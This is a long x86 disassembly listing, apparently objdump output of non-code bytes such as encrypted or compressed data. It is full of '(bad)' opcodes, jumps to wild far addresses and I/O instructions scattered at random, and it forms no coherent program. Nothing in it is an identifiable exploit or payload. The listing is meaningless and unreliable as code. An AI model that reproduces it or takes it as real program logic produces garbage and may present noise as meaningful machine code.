  420e6a:	hlt    
  420e6b:	pop    es
  420e6c:	out    0x67,eax
  420e6e:	mov    es,WORD PTR [ebx+ecx*4-0x9124f36]
  420e75:	mov    BYTE PTR [esi-0x7b],bh
  420e78:	or     eax,0x81259840
  420e7d:	push   ebx
  420e7e:	fcomi  st,st(6)
  420e80:	jp     0x420e9e
  420e82:	push   ds
  420e83:	mov    ecx,0x6db0621c
  420e88:	add    eax,0x6125bd51
  420e8d:	xor    DWORD PTR [ebx],edx
  420e8f:	or     eax,0x1677e8f1
  420e94:	faddp  st(3),st
  420e96:	(bad)  
  420e97:	pushf  
  420e98:	mul    edx
  420e9a:	xor    al,ch
  420e9c:	pop    ebx
  420e9d:	das    
  420e9e:	daa    
  420e9f:	mov    esp,0x5a1b499c
  420ea4:	push   cs
  420ea5:	les    esp,FWORD PTR [ebx+0x414f28a7]
  420eab:	sbb    ebx,ecx
  420ead:	cmp    eax,0x73187321
  420eb2:	cmp    al,bh
  420eb4:	inc    esi
  420eb5:	pshufw mm5,QWORD PTR [ecx-0x6a825c1e],0x55
  420ebd:	lds    ebp,FWORD PTR [esi-0x6b83c824]
  420ec3:	or     al,0x19
  420ec5:	push   0x6844f09d
  420eca:	mov    ds:0xda2f6f66,eax
  420ecf:	lods   eax,DWORD PTR ds:[esi]
  420ed0:	inc    esp
  420ed1:	jmp    0x19df3c02
  420ed6:	cmc    
  420ed7:	jo     0x420eb4
  420ed9:	jl     0x420efb
  420edb:	popa   
  420edc:	mov    bl,0xe6
  420ede:	(bad)
  420ee3:	nop
  420ee4:	jecxz  0x420f39
  420ee6:	add    eax,ebp
  420ee8:	and    BYTE PTR [ebp-0x29],ch
  420eeb:	mov    dh,dl
  420eed:	adc    al,0x6e
  420eef:	mov    ebx,0xa3bda063
  420ef4:	fwait
  420ef5:	pop    esi
  420ef6:	out    dx,eax
  420ef7:	cdq    
  420ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ef9:	jmp    0x569d2df1
  420efe:	cmp    eax,0x7cfe489
  420f03:	mov    ebp,0x78a0e386
  420f08:	adc    edx,DWORD PTR [ebp+0x56f56cf4]
  420f0e:	push   0x1d
	...
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x37479d2e]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	call   0x28a9d55a
  420f91:	je     0x420fc8
  420f93:	stos   BYTE PTR es:[edi],al
  420f94:	in     eax,0x29
  420f96:	dec    ecx
  420f97:	int3   
  420f98:	(bad)  
  420f99:	js     0x421008
  420f9b:	mov    ecx,0x676492e
  420fa0:	adc    BYTE PTR [eax],cl
  420fa2:	rcr    BYTE PTR [edx-0x29],cl
  420fa5:	cli    
  420fa6:	dec    edx
  420fa7:	popf   
  420fa8:	gs dec ebp
  420faa:	aad    0x6d
  420fac:	dec    ebp
  420fad:	ret    0xa111
  420fb0:	in     eax,dx
  420fb1:	mov    bl,0x5
  420fb3:	out    dx,eax
  420fb4:	std    
  420fb5:	out    dx,eax
  420fb6:	cmp    ebp,eax
  420fb8:	push   ecx
  420fb9:	dec    edx
  420fba:	hlt    
  420fbb:	bound  eax,QWORD PTR [eax+0x6a]
  420fbe:	cs shl esi,1
  420fc1:	ret    
  420fc2:	fild   QWORD PTR [esi-0x62f53ef]
  420fc8:	adc    bh,BYTE PTR [edx]
  420fca:	repz pusha 
  420fcc:	jae    0x42103c
  420fce:	push   edx
  420fcf:	mov    cl,0x7d
  420fd1:	or     ebx,DWORD PTR [edi+0x77]
  420fd4:	rcl    DWORD PTR [edi-0x15],cl
  420fd7:	mov    ds:0xadf0bfc7,al
  420fdc:	xor    BYTE PTR [edi],bl
  420fde:	adc    dh,BYTE PTR [edi+0x39]
  420fe1:	or     al,0xcb
  420fe3:	int3   
  420fe4:	and    DWORD PTR [ecx+0x51],edi
  420fe7:	xchg   DWORD PTR [esp+ecx*8+0x6f5a1014],esp
  420fee:	adc    BYTE PTR [ebp-0x8],ah
  420ff1:	rol    DWORD PTR [ebx+0x59e859ca],cl
  420ff7:	inc    ecx
  420ff8:	fst    st(3)
  420ffa:	push   ss
  420ffb:	pop    ecx
  420ffc:	inc    ecx
  420ffd:	ins    BYTE PTR es:[edi],dx
  420ffe:	jmp    0x28786eee
  421003:	mov    dh,0x98
  421005:	dec    esi
  421006:	mov    ebp,0xdfa292f
  42100b:	inc    ecx
  42100c:	mov    al,ds:0xb4dac69d
  421011:	loop   0x421072
  421013:	dec    ecx
  421014:	xchg   esi,edx
  421016:	unpckhps xmm4,XMMWORD PTR ds:0x6eba50b5
  42101d:	push   esi
  42101e:	jmp    0x13ab8f43
  421023:	or     edi,DWORD PTR [edx+eiz*1-0x1cd9787e]
  42102a:	xor    ecx,ebp
  42102c:	mov    ebx,0xa87edccf
  421031:	sar    BYTE PTR [eax+0x3bcf6441],1
  421037:	mov    edi,0x39176f3e
  42103c:	mov    esi,0x7906372b
  421041:	push   ds
  421042:	inc    edi
  421043:	stc    
  421044:	cmp    DWORD PTR [esi+0x46],edi
  421047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421048:	rcr    DWORD PTR [edx+ecx*2],1
  42104b:	inc    edi
  42104c:	xor    eax,0xefc6a3ad
  421051:	and    ah,al
  421053:	outs   dx,BYTE PTR ds:[esi]
  421054:	mov    ecx,DWORD PTR [eax]
  421056:	xchg   edi,eax
  421057:	inc    ebx
  421058:	inc    ebx
  421059:	xchg   edi,eax
  42105a:	ins    BYTE PTR es:[edi],dx
  42105b:	daa    
  42105c:	ins    DWORD PTR es:[edi],dx
  42105d:	xchg   BYTE PTR [edi],bl
  42105f:	daa    
  421060:	mov    edi,0x28598318
  421065:	xchg   esi,eax
  421066:	sar    DWORD PTR [edi-0x1856a6fb],0xb5
  42106d:	pop    ebx
  42106e:	fisttp QWORD PTR [eax+edi*1+0x67a588c7]
  421075:	fadd   DWORD PTR [ecx]
  421077:	pop    eax
  421078:	or     BYTE PTR [ecx],0x50
  42107b:	in     eax,dx
  42107c:	push   esi
  42107d:	cmp    al,0x53
  42107f:	push   ebp
  421080:	js     0x421046
  421082:	mov    ecx,DWORD PTR [edi]
  421084:	pushf  
  421085:	pop    ecx
  421086:	out    dx,eax
  421087:	sbb    BYTE PTR [esi],cl
  421089:	push   0xb02cf77a
  42108e:	nop
  42108f:	loope  0x421091
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,WORD PTR [eax+0xc416835]
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	out    0x5f,eax
  42110e:	inc    ebx
  42110f:	jge    0x421118
  421111:	pop    ebx
  421112:	sub    DWORD PTR [ecx-0x5551d7],ebx
  421118:	inc    esp
  421119:	mov    eax,0x51ee5fdc
  42111e:	addr16 mov ch,0x87
  421121:	mov    edx,0x67a40eb6
  421126:	inc    ebp
  421127:	push   0xcbe2f9ab
  42112c:	lock xor BYTE PTR [edx-0x4],al
  421130:	add    esi,DWORD PTR [ebp+0x6ef2332]
  421136:	stos   BYTE PTR es:[edi],al
  421137:	stos   BYTE PTR es:[edi],al
  421138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42113a:	iret   
  42113b:	jnp    0x42115d
  42113d:	ret    0x4498
  421140:	or     dh,BYTE PTR [ebx]
  421142:	out    dx,al
  421143:	aaa    
  421144:	xchg   ecx,eax
  421145:	dec    ebx
  421146:	or     eax,0x1443de7b
  42114b:	jp     0x42117d
  42114d:	lock mov ah,0x5c
  421150:	lea    edx,[ecx-0x2fc74aef]
  421156:	mov    ds:0xe1094c51,al
  42115b:	ins    BYTE PTR es:[edi],dx
  42115c:	sub    ah,BYTE PTR ds:0x5e1d0cbd
  421162:	jl     0x42111d
  421164:	(bad)  
  421165:	ror    edi,1
  421167:	dec    esp
  421168:	pushw  es
  42116a:	cmp    DWORD PTR [ebx-0x186cd2de],esi
  421170:	call   0x8958:0x2de3f3aa
  421177:	call   0x7f2b2355
  42117c:	and    BYTE PTR [eax],0x8e
  42117f:	(bad)  
  421180:	xchg   esp,eax
  421181:	jmp    0x33fadca1
  421186:	stc    
  421187:	popf   
  421188:	cmp    dl,ch
  42118a:	cmp    al,0x79
  42118c:	(bad)  
  42118d:	cmp    ch,BYTE PTR [ecx+0x49d1caf6]
  421193:	xchg   ecx,eax
  421194:	fwait
  421195:	sbb    cl,cl
  421197:	push   ebp
  421198:	jle    0x421158
  42119a:	(bad)  
  42119b:	push   esp
  42119c:	stc    
  42119d:	(bad)  
  4211a0:	inc    edx
  4211a2:	ror    BYTE PTR [eax-0xf7da04b],0x92
  4211a9:	in     eax,dx
  4211aa:	add    eax,DWORD PTR [ebx+0x6e]
  4211ad:	xchg   ecx,eax
  4211ae:	push   0x8565e24e
  4211b3:	xor    DWORD PTR [edx-0x7dcac94e],esi
  4211b9:	loopne 0x4211e3
  4211bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211bc:	mov    ds:0xf65e2add,eax
  4211c1:	sub    eax,0xe8aa6c90
  4211c6:	xor    eax,0x35a53f4e
  4211cb:	push   edx
  4211cc:	xor    esi,DWORD PTR [edi]
  4211ce:	test   BYTE PTR [esp+eax*8],0x24
  4211d2:	aaa    
  4211d3:	cmp    al,0x5d
  4211d5:	dec    esi
  4211d6:	or     esi,DWORD PTR [edx+eax*4+0x3e]
  4211da:	xor    bl,BYTE PTR [ecx+0x563fd62c]
  4211e0:	mov    eax,ds:0xe76284be
  4211e5:	xchg   ebx,eax
  4211e6:	jae    0x42117f
  4211e8:	and    ecx,edx
  4211ea:	dec    ebx
  4211eb:	addr16 xchg ebp,eax
  4211ed:	jg     0x421213
  4211ef:	push   eax
  4211f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211f1:	sbb    eax,0xec734e71
  4211f6:	or     al,BYTE PTR [eax]
  4211f8:	xchg   edi,eax
  4211f9:	dec    ebx
  4211fa:	pop    edx
  4211fb:	loope  0x42121a
  4211fd:	lahf   
  4211fe:	popf   
  4211ff:	fld    TBYTE PTR [ebp-0x52]
  421202:	or     DWORD PTR [edx-0x2a79e243],ecx
  421208:	or     DWORD PTR [esi],0x63fdddfb
  42120e:	(bad)  
  42120f:	fild   DWORD PTR [eax]
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x9cce7ab3
  421282:	adc    ecx,DWORD PTR [ebp+0x10]
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    al,0x1
  42128a:	add    BYTE PTR [eax],al
  42128c:	mov    ch,0x79
  42128e:	dec    ecx
  42128f:	sbb    al,BYTE PTR [edx-0x58e19034]
  421295:	into   
  421296:	mov    al,0xc5
  421298:	lahf   
  421299:	inc    ebp
  42129a:	(bad)  
  42129c:	jecxz  0x4212a7
  42129e:	aaa    
  42129f:	pop    ebp
  4212a0:	dec    ebp
  4212a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212a2:	or     BYTE PTR [eax-0xc],dh
  4212a5:	(bad)  
  4212a6:	sbb    dl,ah
  4212a8:	xor    eax,0x85fc6ed6
  4212ad:	inc    esi
  4212ae:	ret    
  4212af:	add    bl,ch
  4212b1:	cmp    al,0xbf
  4212b3:	and    dh,bl
  4212b5:	shl    DWORD PTR [eax+0x6a722ee3],1
  4212bb:	xchg   ebx,eax
  4212bc:	dec    ebx
  4212bd:	in     al,dx
  4212be:	retf   0x652e
  4212c1:	dec    edi
  4212c2:	mov    dl,0xf9
  4212c4:	cld    
  4212c5:	test   eax,eax
  4212c7:	test   DWORD PTR [ecx-0x6a],0xb8778a36
  4212ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212cf:	push   edi
  4212d0:	and    bl,BYTE PTR [edi+0x59]
  4212d3:	loopne 0x42127a
  4212d5:	push   edi
  4212d6:	dec    ebx
  4212d7:	scas   al,BYTE PTR es:[edi]
  4212d8:	xchg   DWORD PTR [edx-0x5ad6cca6],ebx
  4212de:	cwde   
  4212df:	or     ecx,DWORD PTR [edi+0x69]
  4212e2:	mul    DWORD PTR [edx+ecx*1+0x55]
  4212e6:	mov    dh,BYTE PTR [ecx+0x3e]
  4212e9:	ss (bad) 
  4212eb:	(bad)  
  4212ec:	xlat   BYTE PTR ds:[ebx]
  4212ed:	push   es
  4212ee:	fistp  QWORD PTR [ebp+ebx*2+0x6a4ad990]
  4212f5:	ror    dl,1
  4212f7:	adc    ecx,edx
  4212f9:	mov    eax,0x76138765
  4212fe:	push   esi
  4212ff:	inc    esi
  421300:	ins    BYTE PTR es:[edi],dx
  421301:	dec    edx
  421302:	inc    eax
  421303:	loope  0x42137d
  421305:	or     DWORD PTR [edi],ebp
  421307:	xchg   edx,eax
  421308:	fwait
  421309:	add    BYTE PTR [ebp+0x41],0x3
  42130d:	sub    DWORD PTR ss:[edx],0xcb6e945d
  421314:	repz pop es
  421316:	out    dx,eax
  421317:	mov    ch,0xc3
  421319:	xor    DWORD PTR [edi+0x60],ecx
  42131c:	sar    esi,0x59
  42131f:	pop    edi
  421320:	push   0x7
  421322:	sti    
  421323:	test   BYTE PTR [ecx],bh
  421325:	add    DWORD PTR [edx],edi
  421327:	pop    esp
  421328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421329:	pusha  
  42132a:	in     al,dx
  42132b:	retf   0x9f3e
  42132e:	push   esp
  42132f:	add    al,0xc7
  421331:	jnp    0x4212d5
  421333:	xchg   ebp,eax
  421334:	(bad)  
  421335:	outs   dx,BYTE PTR ds:[esi]
  421336:	add    esp,ebp
  421338:	sub    DWORD PTR [edx],esp
  42133a:	clc    
  42133b:	mov    ds:0x7d77207d,al
  421340:	mov    ds:0xdaa1ad20,eax
  421345:	xor    BYTE PTR [ebx+0x69],bl
  421348:	mov    ?,WORD PTR [ebp+0x566f3e1a]
  42134e:	add    eax,DWORD PTR [ecx+ebx*4]
  421351:	sbb    eax,0x3094614c
  421356:	scas   eax,DWORD PTR es:[edi]
  421357:	or     al,0xc5
  421359:	dec    esi
  42135a:	push   eax
  42135b:	mov    ecx,DWORD PTR [edi-0x190be3b1]
  421361:	dec    ebx
  421362:	sahf   
  421363:	cdq    
  421364:	ds jns 0xddff0441
  42136b:	xchg   ebx,eax
  42136c:	repz not BYTE PTR [eax]
  42136f:	inc    edx
  421370:	fcmovne st,st(2)
  421372:	pop    edx
  421373:	inc    ecx
  421374:	sahf   
  421375:	out    dx,al
  421376:	retf   0x9a30
  421379:	daa    
  42137a:	dec    esp
  42137b:	and    al,0xbc
  42137d:	bound  ebp,QWORD PTR [eax]
  42137f:	loop   0x421395
  421381:	push   eax
  421382:	sub    al,0x57
  421384:	repz cli 
  421386:	jb     0x4213aa
  421388:	mov    BYTE PTR [esi-0x60931799],ah
  42138e:	dec    ecx
  42138f:	mov    edi,0x0
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x408af49f]
  421402:	and    al,0x74
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	fimul  WORD PTR [eax]
  42140e:	mov    eax,0x12be99c9
  421413:	ins    DWORD PTR es:[edi],dx
  421414:	push   0x19
  421416:	retf   0x24fb
  421419:	dec    eax
  42141a:	dec    edi
  42141b:	jns    0x4213cb
  42141d:	outs   dx,BYTE PTR ds:[esi]
  42141e:	mov    dl,0x25
  421420:	rol    al,1
  421422:	push   ebx
  421423:	(bad)  
  421424:	into   
  421425:	cmp    eax,0x846ef032
  42142a:	addr16 mov ecx,0xa6117aae
  421430:	shr    BYTE PTR [ecx+0x7f],1
  421433:	pop    edi
  421434:	mov    ch,0x4c
  421436:	pop    ecx
  421437:	sbb    DWORD PTR [eax],ebp
  421439:	repnz out dx,al
  42143b:	popa   
  42143c:	adc    DWORD PTR [eax],ebx
  42143e:	popf   
  42143f:	adc    eax,0xed622f38
  421444:	jno    0x421437
  421446:	pop    ecx
  421447:	je     0x421406
  421449:	(bad)  
  42144a:	popf   
  42144b:	push   ebp
  42144c:	call   0x9fae:0x3e7576bd
  421453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421454:	xchg   DWORD PTR [eax+0x4c16e615],edi
  42145a:	pxor   mm0,QWORD PTR [ebp+0x45]
  42145e:	sub    al,0xff
  421460:	sub    al,0xb5
  421462:	pop    es
  421463:	cld    
  421464:	or     al,0x12
  421466:	popa   
  421467:	mov    ds:0x71ea46b3,al
  42146c:	adc    DWORD PTR [edi],esi
  42146e:	mov    edi,0x4e371039
  421473:	out    0x3,al
  421475:	jg     0x42143b
  421477:	in     eax,0x3c
  421479:	add    eax,0x6caf3b23
  42147e:	aaa    
  42147f:	mov    al,ds:0xe5db2157
  421484:	dec    ecx
  421485:	aaa    
  421486:	sbb    edi,DWORD PTR [ebx-0x47328fdd]
  42148c:	jp     0x421494
  42148e:	mov    ecx,0x1786b557
  421493:	jnp    0x421432
  421495:	adc    BYTE PTR [ecx],ah
  421497:	fs iret 
  421499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42149a:	jle    0x42145d
  42149c:	jb     0x4214f7
  42149e:	sbb    eax,0x221c01dc
  4214a3:	jae    0x4214a3
  4214a5:	sub    BYTE PTR [ecx+0x58],dl
  4214a8:	inc    ebx
  4214a9:	sti    
  4214aa:	mov    bh,0x28
  4214ac:	or     esi,DWORD PTR [edx]
  4214ae:	daa    
  4214af:	pop    es
  4214b0:	and    eax,0x4f2162eb
  4214b5:	out    dx,al
  4214b6:	pop    es
  4214b7:	and    cl,BYTE PTR [eax+ebx*8-0xb22f433]
  4214be:	fnstenv [ecx+0x16b0dc87]
  4214c4:	dec    esp
  4214c5:	adc    eax,0x21d3a731
  4214ca:	add    al,0xd5
  4214cc:	xor    BYTE PTR ds:0xc62f5bd4,0xbd
  4214d3:	push   ecx
  4214d4:	call   0x9b727fc4
  4214d9:	jmp    0x3ae9:0x3c1379d5
  4214e0:	sar    DWORD PTR [edx+eax*1+0x2],cl
  4214e4:	adc    dl,BYTE PTR [eax-0x449f6c06]
  4214ea:	cdq    
  4214eb:	shl    DWORD PTR [ebp+ebx*8+0x506ded9c],cl
  4214f2:	cmp    DWORD PTR [eax+0x51],esi
  4214f5:	shl    DWORD PTR [eax+0x72],0x38
  4214f9:	data16 sub BYTE PTR [esi+0x1d1969a7],0x80
  421501:	adc    bl,BYTE PTR [ecx+0x2eb737e9]
  421507:	into   
  421508:	sbb    DWORD PTR [ebp+0x1ee274e6],esi
  42150e:	and    al,0xb9
	...
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x500842b4],bp
  421582:	aas    
  421583:	stc    
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	(bad)  
  42158d:	jb     0x4215f8
  42158f:	cwde   
  421590:	enter  0xd19e,0xf4
  421594:	dec    edi
  421595:	cmp    al,0xc
  421597:	in     eax,0x74
  421599:	je     0x42153e
  42159b:	mov    ds:0x448aa27e,al
  4215a0:	hlt    
  4215a1:	and    eax,ebp
  4215a3:	stc    
  4215a4:	pusha  
  4215a5:	nop
  4215a6:	adc    esi,ebp
  4215a8:	(bad)  
  4215aa:	sbb    ecx,DWORD PTR [edi+0xf47936e]
  4215b0:	cmc    
  4215b1:	dec    edx
  4215b2:	cmp    edi,DWORD PTR [edi+0x4c]
  4215b5:	push   edx
  4215b6:	jmp    0xdb1e3657
  4215bb:	pusha  
  4215bc:	xor    al,0x99
  4215be:	frstor [edx+0x21]
  4215c1:	shr    BYTE PTR [esp+edi*2],cl
  4215c4:	cld    
  4215c5:	jecxz  0x42154b
  4215c7:	cmp    eax,DWORD PTR [edi+0x4b3b0d3c]
  4215cd:	sbb    BYTE PTR [ebx],dh
  4215cf:	retf   
  4215d0:	and    al,0x91
  4215d2:	jb     0x421623
  4215d4:	repz aaa 
  4215d6:	aaa    
  4215d7:	xchg   esp,eax
  4215d8:	adc    ebx,esp
  4215da:	sub    eax,0x55cdf21a
  4215df:	fistp  WORD PTR [esi-0x7471c679]
  4215e5:	dec    edx
  4215e6:	leave  
  4215e7:	sahf   
  4215e8:	jmp    0x680b:0x5e05068d
  4215ef:	pop    esp
  4215f0:	inc    edx
  4215f1:	xchg   ebx,eax
  4215f2:	mov    edi,0x78c080a0
  4215f7:	jg     0x42157b
  4215f9:	scas   ax,WORD PTR es:[edi]
  4215fb:	cmp    BYTE PTR [edx],0x62
  4215fe:	mov    bx,0xb616
  421602:	popa   
  421603:	inc    ebp
  421604:	ss and eax,0x1533d0f2
  42160a:	fild   DWORD PTR [edx]
  42160c:	imul   esp,DWORD PTR [edx-0x2],0x595f99ea
  421613:	fnsave [esi]
  421615:	pop    ss
  421616:	dec    edi
  421617:	jge    0x4215be
  421619:	mov    ds:0x899a4790,al
  42161e:	xchg   edi,eax
  42161f:	jmp    0xf903:0x18ebf5b2
  421626:	push   eax
  421627:	inc    ebp
  421628:	pop    ss
  421629:	test   eax,0xdb5e9efa
  42162e:	sahf   
  42162f:	test   BYTE PTR [edi],dl
  421631:	dec    eax
  421632:	stos   BYTE PTR es:[edi],al
  421633:	or     eax,0xc2ca5c49
  421638:	aam    0xfa
  42163a:	leave  
  42163b:	cs stc 
  42163d:	xchg   esp,eax
  42163e:	clc    
  42163f:	mov    al,ds:0x5c2c4eeb
  421644:	lahf   
  421645:	mov    ecx,0xfc3bf587
  42164a:	mov    bh,0xa1
  42164c:	pop    edi
  42164d:	in     eax,0xb6
  42164f:	mov    al,ds:0x61f42482
  421654:	(bad)  
  421655:	jo     0x42162f
  421657:	out    dx,eax
  421658:	int    0x96
  42165a:	push   es
  42165b:	sub    eax,0x33e85791
  421660:	adc    ebx,DWORD PTR gs:[ecx+ecx*2-0x7f]
  421665:	gs shl ebx,cl
  421668:	ja     0x42165a
  42166a:	jb     0x4216af
  42166c:	mov    DWORD PTR [ebx-0x7e],ecx
  42166f:	out    0x5d,eax
  421671:	inc    eax
  421672:	call   0xb42a:0x191b0df8
  421679:	xchg   ebp,eax
  42167a:	mov    ah,0x17
  42167c:	pop    edi
  42167d:	icebp  
  42167e:	test   eax,0x2a5d83b6
  421683:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421685:	pop    edi
  421686:	adc    al,dl
  421688:	mov    eax,0xa09f2340
  42168d:	nop
  42168e:	scas   eax,DWORD PTR es:[edi]
  42168f:	sbb    eax,0x0
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	addr16 inc edx
  421702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421703:	stos   BYTE PTR es:[edi],al
  421704:	sbb    al,0x64
  421706:	add    DWORD PTR [eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	jnp    0x4216f7
  42170e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42170f:	aam    0xf7
  421711:	popf   
  421712:	adc    al,0x3
  421714:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421716:	fsincos 
  421718:	pop    ds
  421719:	cmp    esi,DWORD PTR [edi-0x76]
  42171c:	mov    edx,0xa2228489
  421721:	bound  esi,QWORD PTR [edx+0x59cb2e4e]
  421727:	pop    ebp
  421728:	cmp    al,0x25
  42172a:	scas   al,BYTE PTR es:[edi]
  42172b:	std    
  42172c:	pop    ebp
  42172d:	push   ss
  42172e:	sbb    edx,DWORD PTR [ebp+0x19be165f]
  421734:	aaa    
  421735:	sahf   
  421736:	sub    esp,DWORD PTR [edx]
  421738:	fadd   DWORD PTR [eax+0x10fa8684]
  42173e:	sub    ch,BYTE PTR [ecx-0x26]
  421741:	bound  ebp,QWORD PTR [edx]
  421743:	mov    ecx,0x1d8487e3
  421748:	nop
  421749:	lods   al,BYTE PTR ds:[esi]
  42174a:	pop    edx
  42174b:	out    dx,al
  42174c:	jecxz  0x42171d
  42174e:	inc    esp
  42174f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421750:	imul   ebx,DWORD PTR [ebp-0xb108348],0x44
  421757:	xchg   DWORD PTR [edi-0x66ed4780],esp
  42175d:	push   edi
  42175e:	popf   
  42175f:	xchg   ch,ch
  421761:	scas   eax,DWORD PTR es:[edi]
  421762:	enter  0xb0df,0x50
  421766:	jge    0x4217e4
  421768:	push   eax
  421769:	pop    ss
  42176a:	xor    al,0x12
  42176c:	dec    eax
  42176d:	lock jmp 0x47b9731a
  421773:	pop    ds
  421774:	mov    ebx,0xd57c5c5d
  421779:	int3   
  42177a:	idiv   dh
  42177c:	shr    DWORD PTR [edx+0x1c],1
  42177f:	into   
  421780:	leave  
  421781:	xchg   ch,cl
  421783:	or     eax,0xb660fa95
  421788:	jmp    0xb471cc8c
  42178d:	fwait
  42178e:	pusha  
  42178f:	or     ah,0x6a
  421792:	add    ebp,DWORD PTR [esi]
  421794:	cld    
  421795:	pop    ebx
  421796:	bound  eax,QWORD PTR [ebx-0x309b5a6a]
  42179c:	retf   
  42179d:	data16 jns 0x42172d
  4217a0:	mov    al,ds:0x916b6835
  4217a5:	inc    esi
  4217a6:	and    eax,0x38d44759
  4217ab:	call   0x301:0x12e5718e
  4217b2:	dec    eax
  4217b3:	mov    ds:0xb24c9444,eax
  4217b8:	mov    esp,0x46375616
  4217bd:	lds    ebp,FWORD PTR [ebx-0x28d1d973]
  4217c3:	and    edx,edx
  4217c5:	add    eax,0x1314b3cc
  4217ca:	mov    esi,0x7df90b8b
  4217cf:	(bad)  
  4217d0:	sub    al,0x2e
  4217d2:	or     BYTE PTR [esi+0x28d5dfc6],0xe1
  4217d9:	mov    bl,cl
  4217db:	loopne 0x42175f
  4217dd:	in     al,dx
  4217de:	push   ecx
  4217df:	(bad)  
  4217e0:	stos   DWORD PTR es:[edi],eax
  4217e1:	loop   0x4217a6
  4217e3:	or     al,0x14
  4217e5:	cwde   
  4217e6:	cmp    eax,DWORD PTR [ebp+0x3bd5788c]
  4217ec:	cmp    DWORD PTR [esi+0x6b2c2d8d],ebp
  4217f2:	mov    edi,0x4c2610c3
  4217f7:	(bad)  
  4217f8:	fnstcw WORD PTR [ecx-0x1e]
  4217fb:	inc    esp
  4217fc:	ds push esi
  4217fe:	sbb    BYTE PTR [ebx],bl
  421800:	add    ecx,ebp
  421802:	(bad)  
  421803:	repz xchg esi,eax
  421805:	mov    bl,0x18
  421807:	cli    
  421808:	inc    ecx
  421809:	jno    0x421855
  42180b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42180c:	pop    ds
  42180d:	cmc    
  42180e:	pop    ss
  42180f:	stc    
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	sub    al,0xa7
  421882:	xchg   ebx,eax
  421883:	stc    
  421884:	and    BYTE PTR [ebp+0x1],ah
  421887:	add    BYTE PTR [ecx+eax*1],al
  42188a:	add    BYTE PTR [eax],al
  42188c:	jae    0x421904
  42188e:	xchg   edi,eax
  42188f:	and    BYTE PTR [eax+0x57e91be2],0xb8
  421896:	fld    QWORD PTR [edx-0x3342a9]
  42189c:	xchg   ecx,eax
  42189d:	test   eax,0xf5cb67db
  4218a2:	dec    edi
  4218a3:	fwait
  4218a4:	in     al,dx
  4218a5:	mov    ss,WORD PTR [edx]
  4218a7:	stc    
  4218a8:	ja     0x42184f
  4218aa:	cmp    esi,esp
  4218ac:	push   0xfffffff8
  4218ae:	ror    ch,cl
  4218b0:	stc    
  4218b1:	pop    ss
  4218b2:	mov    ah,0x82
  4218b4:	dec    eax
  4218b5:	bound  esi,QWORD PTR [edx+edx*8]
  4218b8:	adc    eax,0xa1b97395
  4218bd:	xchg   BYTE PTR [edi],ch
  4218bf:	(bad)  
  4218c1:	push   ss
  4218c2:	dec    edi
  4218c3:	jbe    0x421896
  4218c5:	jge    0x42187b
  4218c7:	inc    esi
  4218c8:	pop    edx
  4218c9:	lods   al,BYTE PTR ds:[esi]
  4218cb:	xor    cl,al
  4218cd:	dec    edi
  4218ce:	lods   eax,DWORD PTR ds:[esi]
  4218cf:	cwde   
  4218d0:	or     al,BYTE PTR [esi+0x51cfdeb4]
  4218d6:	sbb    eax,0xedbc099e
  4218db:	loopne 0x421892
  4218dd:	mov    BYTE PTR [esi-0x15],al
  4218e0:	enter  0x5a0c,0x7e
  4218e4:	mov    edi,?
  4218e6:	mov    cl,0x36
  4218e8:	ret    
  4218e9:	test   al,0x95
  4218eb:	xchg   BYTE PTR [ebx-0x36587df8],al
